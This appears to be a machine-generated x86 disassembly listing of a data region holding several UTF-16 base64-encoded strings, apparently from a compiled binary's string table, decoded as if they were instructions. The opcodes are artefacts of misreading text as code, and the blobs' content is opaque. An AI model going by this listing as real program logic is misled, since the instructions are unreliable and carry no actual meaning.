  40b12c:	00 2b                	add    %ch,(%ebx)
  40b12e:	00 50 00             	add    %dl,0x0(%eax)
  40b131:	79 00                	jns    0x40b133
  40b133:	45                   	inc    %ebp
  40b134:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b137:	77 00                	ja     0x40b139
  40b139:	33 00                	xor    (%eax),%eax
  40b13b:	6c                   	insb   (%dx),%es:(%edi)
  40b13c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b13f:	4d                   	dec    %ebp
  40b140:	00 46 00             	add    %al,0x0(%esi)
  40b143:	55                   	push   %ebp
  40b144:	00 4d 00             	add    %cl,0x0(%ebp)
  40b147:	4c                   	dec    %esp
  40b148:	00 49 00             	add    %cl,0x0(%ecx)
  40b14b:	61                   	popa
  40b14c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b14f:	4a                   	dec    %edx
  40b150:	00 73 00             	add    %dh,0x0(%ebx)
  40b153:	4c                   	dec    %esp
  40b154:	00 35 00 33 00 51    	add    %dh,0x51003300
  40b15a:	00 61 00             	add    %ah,0x0(%ecx)
  40b15d:	43                   	inc    %ebx
  40b15e:	00 30                	add    %dh,(%eax)
  40b160:	00 37                	add    %dh,(%edi)
  40b162:	00 4f 00             	add    %cl,0x0(%edi)
  40b165:	62 00                	bound  %eax,(%eax)
  40b167:	36 00 38             	add    %bh,%ss:(%eax)
  40b16a:	00 65 00             	add    %ah,0x0(%ebp)
  40b16d:	4a                   	dec    %edx
  40b16e:	00 52 00             	add    %dl,0x0(%edx)
  40b171:	75 00                	jne    0x40b173
  40b173:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40b177:	53                   	push   %ebx
  40b178:	00 2f                	add    %ch,(%edi)
  40b17a:	00 57 00             	add    %dl,0x0(%edi)
  40b17d:	54                   	push   %esp
  40b17e:	00 70 00             	add    %dh,0x0(%eax)
  40b181:	6f                   	outsl  %ds:(%esi),(%dx)
  40b182:	00 55 00             	add    %dl,0x0(%ebp)
  40b185:	6a 00                	push   $0x0
  40b187:	5a                   	pop    %edx
  40b188:	00 5a 00             	add    %bl,0x0(%edx)
  40b18b:	6d                   	insl   (%dx),%es:(%edi)
  40b18c:	00 57 00             	add    %dl,0x0(%edi)
  40b18f:	71 00                	jno    0x40b191
  40b191:	4c                   	dec    %esp
  40b192:	00 57 00             	add    %dl,0x0(%edi)
  40b195:	77 00                	ja     0x40b197
  40b197:	47                   	inc    %edi
  40b198:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40b19c:	00 36                	add    %dh,(%esi)
  40b19e:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40b1a2:	00 47 00             	add    %al,0x0(%edi)
  40b1a5:	35 00 74 00 39       	xor    $0x39007400,%eax
  40b1aa:	00 58 00             	add    %bl,0x0(%eax)
  40b1ad:	4b                   	dec    %ebx
  40b1ae:	00 30                	add    %dh,(%eax)
  40b1b0:	00 70 00             	add    %dh,0x0(%eax)
  40b1b3:	6b 00 47             	imul   $0x47,(%eax),%eax
  40b1b6:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1b9:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40b1bd:	6d                   	insl   (%dx),%es:(%edi)
  40b1be:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1c1:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40b1c5:	38 00                	cmp    %al,(%eax)
  40b1c7:	31 00                	xor    %eax,(%eax)
  40b1c9:	61                   	popa
  40b1ca:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40b1ce:	00 57 00             	add    %dl,0x0(%edi)
  40b1d1:	2b 00                	sub    (%eax),%eax
  40b1d3:	2f                   	das
  40b1d4:	00 48 00             	add    %cl,0x0(%eax)
  40b1d7:	63 00                	arpl   %eax,(%eax)
  40b1d9:	79 00                	jns    0x40b1db
  40b1db:	71 00                	jno    0x40b1dd
  40b1dd:	7a 00                	jp     0x40b1df
  40b1df:	32 00                	xor    (%eax),%al
  40b1e1:	7a 00                	jp     0x40b1e3
  40b1e3:	4c                   	dec    %esp
  40b1e4:	00 47 00             	add    %al,0x0(%edi)
  40b1e7:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40b1eb:	42                   	inc    %edx
  40b1ec:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1ef:	41                   	inc    %ecx
  40b1f0:	00 33                	add    %dh,(%ebx)
  40b1f2:	00 4b 00             	add    %cl,0x0(%ebx)
  40b1f5:	39 00                	cmp    %eax,(%eax)
  40b1f7:	31 00                	xor    %eax,(%eax)
  40b1f9:	49                   	dec    %ecx
  40b1fa:	00 58 00             	add    %bl,0x0(%eax)
  40b1fd:	73 00                	jae    0x40b1ff
  40b1ff:	64 00 38             	add    %bh,%fs:(%eax)
  40b202:	00 56 00             	add    %dl,0x0(%esi)
  40b205:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40b209:	54                   	push   %esp
  40b20a:	00 75 00             	add    %dh,0x0(%ebp)
  40b20d:	68 00 2f 00 4d       	push   $0x4d002f00
  40b212:	00 76 00             	add    %dh,0x0(%esi)
  40b215:	52                   	push   %edx
  40b216:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  40b21a:	00 72 00             	add    %dh,0x0(%edx)
  40b21d:	79 00                	jns    0x40b21f
  40b21f:	68 00 72 00 78       	push   $0x78007200
  40b224:	00 41 00             	add    %al,0x0(%ecx)
  40b227:	52                   	push   %edx
  40b228:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40b22c:	00 62 00             	add    %ah,0x0(%edx)
  40b22f:	52                   	push   %edx
  40b230:	00 30                	add    %dh,(%eax)
  40b232:	00 56 00             	add    %dl,0x0(%esi)
  40b235:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40b239:	31 00                	xor    %eax,(%eax)
  40b23b:	49                   	dec    %ecx
  40b23c:	00 6e 00             	add    %ch,0x0(%esi)
  40b23f:	55                   	push   %ebp
  40b240:	00 6f 00             	add    %ch,0x0(%edi)
  40b243:	58                   	pop    %eax
  40b244:	00 43 00             	add    %al,0x0(%ebx)
  40b247:	78 00                	js     0x40b249
  40b249:	32 00                	xor    (%eax),%al
  40b24b:	61                   	popa
  40b24c:	00 46 00             	add    %al,0x0(%esi)
  40b24f:	79 00                	jns    0x40b251
  40b251:	45                   	inc    %ebp
  40b252:	00 6f 00             	add    %ch,0x0(%edi)
  40b255:	30 00                	xor    %al,(%eax)
  40b257:	53                   	push   %ebx
  40b258:	00 46 00             	add    %al,0x0(%esi)
  40b25b:	7a 00                	jp     0x40b25d
  40b25d:	63 00                	arpl   %eax,(%eax)
  40b25f:	69 00 70 00 73 00    	imul   $0x730070,(%eax),%eax
  40b265:	78 00                	js     0x40b267
  40b267:	37                   	aaa
  40b268:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40b26c:	00 35 00 35 00 4b    	add    %dh,0x4b003500
  40b272:	00 7a 00             	add    %bh,0x0(%edx)
  40b275:	68 00 51 00 53       	push   $0x53005100
  40b27a:	00 4a 00             	add    %cl,0x0(%edx)
  40b27d:	55                   	push   %ebp
  40b27e:	00 5a 00             	add    %bl,0x0(%edx)
  40b281:	49                   	dec    %ecx
  40b282:	00 55 00             	add    %dl,0x0(%ebp)
  40b285:	6a 00                	push   $0x0
  40b287:	31 00                	xor    %eax,(%eax)
  40b289:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40b28d:	76 00                	jbe    0x40b28f
  40b28f:	68 00 41 00 75       	push   $0x75004100
  40b294:	00 45 00             	add    %al,0x0(%ebp)
  40b297:	32 00                	xor    (%eax),%al
  40b299:	70 00                	jo     0x40b29b
  40b29b:	53                   	push   %ebx
  40b29c:	00 4f 00             	add    %cl,0x0(%edi)
  40b29f:	49                   	dec    %ecx
  40b2a0:	00 78 00             	add    %bh,0x0(%eax)
  40b2a3:	4b                   	dec    %ebx
  40b2a4:	00 4f 00             	add    %cl,0x0(%edi)
  40b2a7:	44                   	inc    %esp
  40b2a8:	00 65 00             	add    %ah,0x0(%ebp)
  40b2ab:	55                   	push   %ebp
  40b2ac:	00 6a 00             	add    %ch,0x0(%edx)
  40b2af:	41                   	inc    %ecx
  40b2b0:	00 38                	add    %bh,(%eax)
  40b2b2:	00 58 00             	add    %bl,0x0(%eax)
  40b2b5:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40b2b9:	4a                   	dec    %edx
  40b2ba:	00 77 00             	add    %dh,0x0(%edi)
  40b2bd:	35 00 36 00 2f       	xor    $0x2f003600,%eax
  40b2c2:	00 71 00             	add    %dh,0x0(%ecx)
  40b2c5:	74 00                	je     0x40b2c7
  40b2c7:	6d                   	insl   (%dx),%es:(%edi)
  40b2c8:	00 41 00             	add    %al,0x0(%ecx)
  40b2cb:	4a                   	dec    %edx
  40b2cc:	00 6e 00             	add    %ch,0x0(%esi)
  40b2cf:	6b 00 66             	imul   $0x66,(%eax),%eax
  40b2d2:	00 30                	add    %dh,(%eax)
  40b2d4:	00 41 00             	add    %al,0x0(%ecx)
  40b2d7:	72 00                	jb     0x40b2d9
  40b2d9:	58                   	pop    %eax
  40b2da:	00 55 00             	add    %dl,0x0(%ebp)
  40b2dd:	65 00 6c 00 43       	add    %ch,%gs:0x43(%eax,%eax,1)
  40b2e2:	00 72 00             	add    %dh,0x0(%edx)
  40b2e5:	52                   	push   %edx
  40b2e6:	00 32                	add    %dh,(%edx)
  40b2e8:	00 70 00             	add    %dh,0x0(%eax)
  40b2eb:	4f                   	dec    %edi
  40b2ec:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40b2f0:	00 72 00             	add    %dh,0x0(%edx)
  40b2f3:	37                   	aaa
  40b2f4:	00 6a 00             	add    %ch,0x0(%edx)
  40b2f7:	36 00 32             	add    %dh,%ss:(%edx)
  40b2fa:	00 39                	add    %bh,(%ecx)
  40b2fc:	00 79 00             	add    %bh,0x0(%ecx)
  40b2ff:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40b303:	51                   	push   %ecx
  40b304:	00 62 00             	add    %ah,0x0(%edx)
  40b307:	33 00                	xor    (%eax),%eax
  40b309:	56                   	push   %esi
  40b30a:	00 32                	add    %dh,(%edx)
  40b30c:	00 45 00             	add    %al,0x0(%ebp)
  40b30f:	4a                   	dec    %edx
  40b310:	00 6a 00             	add    %ch,0x0(%edx)
  40b313:	37                   	aaa
  40b314:	00 5a 00             	add    %bl,0x0(%edx)
  40b317:	4f                   	dec    %edi
  40b318:	00 77 00             	add    %dh,0x0(%edi)
  40b31b:	51                   	push   %ecx
  40b31c:	00 42 00             	add    %al,0x0(%edx)
  40b31f:	48                   	dec    %eax
  40b320:	00 62 00             	add    %ah,0x0(%edx)
  40b323:	4b                   	dec    %ebx
  40b324:	00 45 00             	add    %al,0x0(%ebp)
  40b327:	73 00                	jae    0x40b329
  40b329:	6f                   	outsl  %ds:(%esi),(%dx)
  40b32a:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40b32e:	00 42 00             	add    %al,0x0(%edx)
  40b331:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40b334:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40b338:	00 78 00             	add    %bh,0x0(%eax)
  40b33b:	4f                   	dec    %edi
  40b33c:	00 61 00             	add    %ah,0x0(%ecx)
  40b33f:	42                   	inc    %edx
  40b340:	00 38                	add    %bh,(%eax)
  40b342:	00 4a 00             	add    %cl,0x0(%edx)
  40b345:	6c                   	insb   (%dx),%es:(%edi)
  40b346:	00 66 00             	add    %ah,0x0(%esi)
  40b349:	45                   	inc    %ebp
  40b34a:	00 5a 00             	add    %bl,0x0(%edx)
  40b34d:	2b 00                	sub    (%eax),%eax
  40b34f:	71 00                	jno    0x40b351
  40b351:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40b355:	4f                   	dec    %edi
  40b356:	00 59 00             	add    %bl,0x0(%ecx)
  40b359:	2f                   	das
  40b35a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b35d:	69 00 75 00 6b 00    	imul   $0x6b0075,(%eax),%eax
  40b363:	6c                   	insb   (%dx),%es:(%edi)
  40b364:	00 6f 00             	add    %ch,0x0(%edi)
  40b367:	79 00                	jns    0x40b369
  40b369:	57                   	push   %edi
  40b36a:	00 4e 00             	add    %cl,0x0(%esi)
  40b36d:	6c                   	insb   (%dx),%es:(%edi)
  40b36e:	00 37                	add    %dh,(%edi)
  40b370:	00 79 00             	add    %bh,0x0(%ecx)
  40b373:	55                   	push   %ebp
  40b374:	00 58 00             	add    %bl,0x0(%eax)
  40b377:	55                   	push   %ebp
  40b378:	00 4f 00             	add    %cl,0x0(%edi)
  40b37b:	75 00                	jne    0x40b37d
  40b37d:	64 00 38             	add    %bh,%fs:(%eax)
  40b380:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40b384:	00 4a 00             	add    %cl,0x0(%edx)
  40b387:	4a                   	dec    %edx
  40b388:	00 65 00             	add    %ah,0x0(%ebp)
  40b38b:	47                   	inc    %edi
  40b38c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b38f:	56                   	push   %esi
  40b390:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40b394:	00 2f                	add    %ch,(%edi)
  40b396:	00 52 00             	add    %dl,0x0(%edx)
  40b399:	33 00                	xor    (%eax),%eax
  40b39b:	46                   	inc    %esi
  40b39c:	00 70 00             	add    %dh,0x0(%eax)
  40b39f:	76 00                	jbe    0x40b3a1
  40b3a1:	71 00                	jno    0x40b3a3
  40b3a3:	6c                   	insb   (%dx),%es:(%edi)
  40b3a4:	00 72 00             	add    %dh,0x0(%edx)
  40b3a7:	6d                   	insl   (%dx),%es:(%edi)
  40b3a8:	00 69 00             	add    %ch,0x0(%ecx)
  40b3ab:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3ac:	00 39                	add    %bh,(%ecx)
  40b3ae:	00 57 00             	add    %dl,0x0(%edi)
  40b3b1:	31 00                	xor    %eax,(%eax)
  40b3b3:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b3b7:	4c                   	dec    %esp
  40b3b8:	00 65 00             	add    %ah,0x0(%ebp)
  40b3bb:	6a 00                	push   $0x0
  40b3bd:	53                   	push   %ebx
  40b3be:	00 32                	add    %dh,(%edx)
  40b3c0:	00 59 00             	add    %bl,0x0(%ecx)
  40b3c3:	51                   	push   %ecx
  40b3c4:	00 51 00             	add    %dl,0x0(%ecx)
  40b3c7:	74 00                	je     0x40b3c9
  40b3c9:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b3cd:	59                   	pop    %ecx
  40b3ce:	00 59 00             	add    %bl,0x0(%ecx)
  40b3d1:	53                   	push   %ebx
  40b3d2:	00 2f                	add    %ch,(%edi)
  40b3d4:	00 50 00             	add    %dl,0x0(%eax)
  40b3d7:	4d                   	dec    %ebp
  40b3d8:	00 71 00             	add    %dh,0x0(%ecx)
  40b3db:	63 00                	arpl   %eax,(%eax)
  40b3dd:	5a                   	pop    %edx
  40b3de:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40b3e2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b3e5:	4b                   	dec    %ebx
  40b3e6:	00 41 00             	add    %al,0x0(%ecx)
  40b3e9:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40b3ed:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40b3f1:	6b 00 37             	imul   $0x37,(%eax),%eax
  40b3f4:	00 35 00 43 00 4e    	add    %dh,0x4e004300
  40b3fa:	00 72 00             	add    %dh,0x0(%edx)
  40b3fd:	51                   	push   %ecx
  40b3fe:	00 45 00             	add    %al,0x0(%ebp)
  40b401:	62 00                	bound  %eax,(%eax)
  40b403:	6c                   	insb   (%dx),%es:(%edi)
  40b404:	00 68 00             	add    %ch,0x0(%eax)
  40b407:	56                   	push   %esi
  40b408:	00 43 00             	add    %al,0x0(%ebx)
  40b40b:	79 00                	jns    0x40b40d
  40b40d:	32 00                	xor    (%eax),%al
  40b40f:	44                   	inc    %esp
  40b410:	00 63 00             	add    %ah,0x0(%ebx)
  40b413:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b417:	6a 00                	push   $0x0
  40b419:	4c                   	dec    %esp
  40b41a:	00 66 00             	add    %ah,0x0(%esi)
  40b41d:	52                   	push   %edx
  40b41e:	00 47 00             	add    %al,0x0(%edi)
  40b421:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40b425:	49                   	dec    %ecx
  40b426:	00 73 00             	add    %dh,0x0(%ebx)
  40b429:	44                   	inc    %esp
  40b42a:	00 30                	add    %dh,(%eax)
  40b42c:	00 57 00             	add    %dl,0x0(%edi)
  40b42f:	76 00                	jbe    0x40b431
  40b431:	34 00                	xor    $0x0,%al
  40b433:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40b437:	57                   	push   %edi
  40b438:	00 7a 00             	add    %bh,0x0(%edx)
  40b43b:	32 00                	xor    (%eax),%al
  40b43d:	4e                   	dec    %esi
  40b43e:	00 36                	add    %dh,(%esi)
  40b440:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40b444:	00 55 00             	add    %dl,0x0(%ebp)
  40b447:	76 00                	jbe    0x40b449
  40b449:	55                   	push   %ebp
  40b44a:	00 47 00             	add    %al,0x0(%edi)
  40b44d:	72 00                	jb     0x40b44f
  40b44f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b450:	00 4a 00             	add    %cl,0x0(%edx)
  40b453:	43                   	inc    %ebx
  40b454:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40b458:	00 37                	add    %dh,(%edi)
  40b45a:	00 52 00             	add    %dl,0x0(%edx)
  40b45d:	37                   	aaa
  40b45e:	00 72 00             	add    %dh,0x0(%edx)
  40b461:	6d                   	insl   (%dx),%es:(%edi)
  40b462:	00 4f 00             	add    %cl,0x0(%edi)
  40b465:	30 00                	xor    %al,(%eax)
  40b467:	42                   	inc    %edx
  40b468:	00 46 00             	add    %al,0x0(%esi)
  40b46b:	68 00 39 00 4b       	push   $0x4b003900
  40b470:	00 46 00             	add    %al,0x0(%esi)
  40b473:	71 00                	jno    0x40b475
  40b475:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b479:	55                   	push   %ebp
  40b47a:	00 7a 00             	add    %bh,0x0(%edx)
  40b47d:	32 00                	xor    (%eax),%al
  40b47f:	4c                   	dec    %esp
  40b480:	00 69 00             	add    %ch,0x0(%ecx)
  40b483:	62 00                	bound  %eax,(%eax)
  40b485:	74 00                	je     0x40b487
  40b487:	51                   	push   %ecx
  40b488:	00 71 00             	add    %dh,0x0(%ecx)
  40b48b:	71 00                	jno    0x40b48d
  40b48d:	31 00                	xor    %eax,(%eax)
  40b48f:	75 00                	jne    0x40b491
  40b491:	7a 00                	jp     0x40b493
  40b493:	62 00                	bound  %eax,(%eax)
  40b495:	78 00                	js     0x40b497
  40b497:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40b49b:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40b49f:	55                   	push   %ebp
  40b4a0:	00 77 00             	add    %dh,0x0(%edi)
  40b4a3:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b4a8:	80 b1 58 00 42 00 47 	xorb   $0x47,0x420058(%ecx)
  40b4af:	00 2f                	add    %ch,(%edi)
  40b4b1:	00 52 00             	add    %dl,0x0(%edx)
  40b4b4:	35 00 54 00 6f       	xor    $0x6f005400,%eax
  40b4b9:	00 50 00             	add    %dl,0x0(%eax)
  40b4bc:	56                   	push   %esi
  40b4bd:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40b4c1:	00 2f                	add    %ch,(%edi)
  40b4c3:	00 6a 00             	add    %ch,0x0(%edx)
  40b4c6:	39 00                	cmp    %eax,(%eax)
  40b4c8:	68 00 69 00 4b       	push   $0x4b006900
  40b4cd:	00 69 00             	add    %ch,0x0(%ecx)
  40b4d0:	77 00                	ja     0x40b4d2
  40b4d2:	46                   	inc    %esi
  40b4d3:	00 77 00             	add    %dh,0x0(%edi)
  40b4d6:	76 00                	jbe    0x40b4d8
  40b4d8:	61                   	popa
  40b4d9:	00 58 00             	add    %bl,0x0(%eax)
  40b4dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4dd:	00 51 00             	add    %dl,0x0(%ecx)
  40b4e0:	34 00                	xor    $0x0,%al
  40b4e2:	61                   	popa
  40b4e3:	00 76 00             	add    %dh,0x0(%esi)
  40b4e6:	53                   	push   %ebx
  40b4e7:	00 2b                	add    %ch,(%ebx)
  40b4e9:	00 78 00             	add    %bh,0x0(%eax)
  40b4ec:	47                   	inc    %edi
  40b4ed:	00 41 00             	add    %al,0x0(%ecx)
  40b4f0:	41                   	inc    %ecx
  40b4f1:	00 75 00             	add    %dh,0x0(%ebp)
  40b4f4:	43                   	inc    %ebx
  40b4f5:	00 46 00             	add    %al,0x0(%esi)
  40b4f8:	43                   	inc    %ebx
  40b4f9:	00 5a 00             	add    %bl,0x0(%edx)
  40b4fc:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40b500:	59                   	pop    %ecx
  40b501:	00 45 00             	add    %al,0x0(%ebp)
  40b504:	66 00 37             	data16 add %dh,(%edi)
  40b507:	00 51 00             	add    %dl,0x0(%ecx)
  40b50a:	66 00 35 00 51 00 6d 	data16 add %dh,0x6d005100
  40b511:	00 53 00             	add    %dl,0x0(%ebx)
  40b514:	44                   	inc    %esp
  40b515:	00 6b 00             	add    %ch,0x0(%ebx)
  40b518:	4e                   	dec    %esi
  40b519:	00 72 00             	add    %dh,0x0(%edx)
  40b51c:	39 00                	cmp    %eax,(%eax)
  40b51e:	47                   	inc    %edi
  40b51f:	00 6a 00             	add    %ch,0x0(%edx)
  40b522:	4b                   	dec    %ebx
  40b523:	00 56 00             	add    %dl,0x0(%esi)
  40b526:	69 00 7a 00 6a 00    	imul   $0x6a007a,(%eax),%eax
  40b52c:	44                   	inc    %esp
  40b52d:	00 4e 00             	add    %cl,0x0(%esi)
  40b530:	33 00                	xor    (%eax),%eax
  40b532:	38 00                	cmp    %al,(%eax)
  40b534:	72 00                	jb     0x40b536
  40b536:	30 00                	xor    %al,(%eax)
  40b538:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b53b:	00 37                	add    %dh,(%edi)
  40b53d:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40b541:	00 6a 00             	add    %ch,0x0(%edx)
  40b544:	74 00                	je     0x40b546
  40b546:	74 00                	je     0x40b548
  40b548:	4e                   	dec    %esi
  40b549:	00 2f                	add    %ch,(%edi)
  40b54b:	00 59 00             	add    %bl,0x0(%ecx)
  40b54e:	77 00                	ja     0x40b550
  40b550:	42                   	inc    %edx
  40b551:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40b555:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b55b:	80 b1 72 00 37 00 62 	xorb   $0x62,0x370072(%ecx)
  40b562:	00 70 00             	add    %dh,0x0(%eax)
  40b565:	74 00                	je     0x40b567
  40b567:	49                   	dec    %ecx
  40b568:	00 6f 00             	add    %ch,0x0(%edi)
  40b56b:	70 00                	jo     0x40b56d
  40b56d:	38 00                	cmp    %al,(%eax)
  40b56f:	50                   	push   %eax
  40b570:	00 68 00             	add    %ch,0x0(%eax)
  40b573:	79 00                	jns    0x40b575
  40b575:	7a 00                	jp     0x40b577
  40b577:	6f                   	outsl  %ds:(%esi),(%dx)
  40b578:	00 77 00             	add    %dh,0x0(%edi)
  40b57b:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40b57f:	37                   	aaa
  40b580:	00 30                	add    %dh,(%eax)
  40b582:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b586:	00 42 00             	add    %al,0x0(%edx)
  40b589:	31 00                	xor    %eax,(%eax)
  40b58b:	6c                   	insb   (%dx),%es:(%edi)
  40b58c:	00 4a 00             	add    %cl,0x0(%edx)
  40b58f:	2f                   	das
  40b590:	00 4e 00             	add    %cl,0x0(%esi)
  40b593:	64 00 36             	add    %dh,%fs:(%esi)
  40b596:	00 45 00             	add    %al,0x0(%ebp)
  40b599:	52                   	push   %edx
  40b59a:	00 75 00             	add    %dh,0x0(%ebp)
  40b59d:	44                   	inc    %esp
  40b59e:	00 4e 00             	add    %cl,0x0(%esi)
  40b5a1:	41                   	inc    %ecx
  40b5a2:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40b5a6:	00 4f 00             	add    %cl,0x0(%edi)
  40b5a9:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40b5ad:	77 00                	ja     0x40b5af
  40b5af:	49                   	dec    %ecx
  40b5b0:	00 51 00             	add    %dl,0x0(%ecx)
  40b5b3:	4f                   	dec    %edi
  40b5b4:	00 63 00             	add    %ah,0x0(%ebx)
  40b5b7:	63 00                	arpl   %eax,(%eax)
  40b5b9:	34 00                	xor    $0x0,%al
  40b5bb:	78 00                	js     0x40b5bd
  40b5bd:	57                   	push   %edi
  40b5be:	00 63 00             	add    %ah,0x0(%ebx)
  40b5c1:	2f                   	das
  40b5c2:	00 53 00             	add    %dl,0x0(%ebx)
  40b5c5:	33 00                	xor    (%eax),%eax
  40b5c7:	2f                   	das
  40b5c8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b5cb:	55                   	push   %ebp
  40b5cc:	00 49 00             	add    %cl,0x0(%ecx)
  40b5cf:	45                   	inc    %ebp
  40b5d0:	00 48 00             	add    %cl,0x0(%eax)
  40b5d3:	4c                   	dec    %esp
  40b5d4:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40b5d8:	00 61 00             	add    %ah,0x0(%ecx)
  40b5db:	72 00                	jb     0x40b5dd
  40b5dd:	57                   	push   %edi
  40b5de:	00 33                	add    %dh,(%ebx)
  40b5e0:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40b5e4:	00 5a 00             	add    %bl,0x0(%edx)
  40b5e7:	5a                   	pop    %edx
  40b5e8:	00 48 00             	add    %cl,0x0(%eax)
  40b5eb:	79 00                	jns    0x40b5ed
  40b5ed:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40b5f1:	32 00                	xor    (%eax),%al
  40b5f3:	70 00                	jo     0x40b5f5
  40b5f5:	7a 00                	jp     0x40b5f7
  40b5f7:	54                   	push   %esp
  40b5f8:	00 79 00             	add    %bh,0x0(%ecx)
  40b5fb:	4e                   	dec    %esi
  40b5fc:	00 45 00             	add    %al,0x0(%ebp)
  40b5ff:	39 00                	cmp    %eax,(%eax)
  40b601:	72 00                	jb     0x40b603
  40b603:	37                   	aaa
  40b604:	00 59 00             	add    %bl,0x0(%ecx)
  40b607:	51                   	push   %ecx
  40b608:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b60e:	80 b1 78 00 2b 00 39 	xorb   $0x39,0x2b0078(%ecx)
  40b615:	00 4d 00             	add    %cl,0x0(%ebp)
  40b618:	52                   	push   %edx
  40b619:	00 6e 00             	add    %ch,0x0(%esi)
  40b61c:	43                   	inc    %ebx
  40b61d:	00 67 00             	add    %ah,0x0(%edi)
  40b620:	58                   	pop    %eax
  40b621:	00 62 00             	add    %ah,0x0(%edx)
  40b624:	64 00 32             	add    %dh,%fs:(%edx)
  40b627:	00 4a 00             	add    %cl,0x0(%edx)
  40b62a:	4a                   	dec    %edx
  40b62b:	00 76 00             	add    %dh,0x0(%esi)
  40b62e:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40b632:	68 00 30 00 4f       	push   $0x4f003000
  40b637:	00 56 00             	add    %dl,0x0(%esi)
  40b63a:	6a 00                	push   $0x0
  40b63c:	59                   	pop    %ecx
  40b63d:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40b641:	00 62 00             	add    %ah,0x0(%edx)
  40b644:	2b 00                	sub    (%eax),%eax
  40b646:	32 00                	xor    (%eax),%al
  40b648:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40b64c:	70 00                	jo     0x40b64e
  40b64e:	76 00                	jbe    0x40b650
  40b650:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b654:	78 00                	js     0x40b656
  40b656:	7a 00                	jp     0x40b658
  40b658:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b65c:	64 00 35 00 71 00 71 	add    %dh,%fs:0x71007100
  40b663:	00 48 00             	add    %cl,0x0(%eax)
  40b666:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40b66a:	6d                   	insl   (%dx),%es:(%edi)
  40b66b:	00 30                	add    %dh,(%eax)
  40b66d:	00 61 00             	add    %ah,0x0(%ecx)
  40b670:	32 00                	xor    (%eax),%al
  40b672:	73 00                	jae    0x40b674
  40b674:	70 00                	jo     0x40b676
  40b676:	7a 00                	jp     0x40b678
  40b678:	70 00                	jo     0x40b67a
  40b67a:	76 00                	jbe    0x40b67c
  40b67c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b67d:	00 36                	add    %dh,(%esi)
  40b67f:	00 2f                	add    %ch,(%edi)
  40b681:	00 55 00             	add    %dl,0x0(%ebp)
  40b684:	2b 00                	sub    (%eax),%eax
  40b686:	74 00                	je     0x40b688
  40b688:	48                   	dec    %eax
  40b689:	00 53 00             	add    %dl,0x0(%ebx)
  40b68c:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b690:	76 00                	jbe    0x40b692
  40b692:	55                   	push   %ebp
  40b693:	00 72 00             	add    %dh,0x0(%edx)
  40b696:	5a                   	pop    %edx
  40b697:	00 59 00             	add    %bl,0x0(%ecx)
  40b69a:	30 00                	xor    %al,(%eax)
